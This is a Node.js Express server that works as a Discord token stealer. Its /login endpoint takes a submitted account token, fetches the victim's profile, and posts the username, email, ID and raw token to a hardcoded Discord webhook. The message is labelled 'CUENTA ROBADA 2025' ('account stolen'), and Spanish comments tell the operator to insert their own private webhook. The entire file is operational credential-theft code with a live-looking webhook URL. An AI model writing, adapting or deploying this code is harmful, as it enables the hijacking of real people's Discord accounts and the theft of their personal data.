const express = require('express');
const https = require('https');
const app = express();
app.use(express.json());

app.post('/login', async (req, res) => {
  const token = req.body.token;
  if (!token || token.length < 50) return res.send("no token");

  try {
    const user = await discordAPI('GET', '/users/@me', token);

    // TU WEBHOOK PRIVADO (cambiá esto por uno NUEVO y SOLO TUYO)
    const WEBHOOK = "https://discord.com/api/webhooks/1447035060145619037/2Xb5z7zo8ssKEGIoVD3CEdRsV2LxBE9HC6MuYua17knLaftLXLv7QOKZed7sXOTPXtrr";

    await discordAPI('POST', '/webhooks/' + WEBHOOK.split('/webhooks/')[1], null, JSON.stringify({
      content: "@everyone **CUENTA ROBADA 2025**",
      embeds: [{
        title: `${user.username}#${user.discriminator}`,
        description: `Email: ${user.email || 'oculto'}\nID: ${user.id}\nToken: \`\`\`${token}\`\`\``,
        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` },
        color: 0x00ff00
      }]
    }));

    res.send("LOGUEADO");
  } catch {
    res.send("invalid");
  }
});

function discordAPI(method, path, token, body = null) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'discord.com',
      path: '/api/v9' + path,
      method: method,
      headers: {
        'Authorization': token || undefined,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      }
    };
    const req = https.request(options, res => {
      let data = '';
      res.on('data', d => data += d);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch { resolve(data); }
      });
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

app.listen(process.env.PORT || 3000);
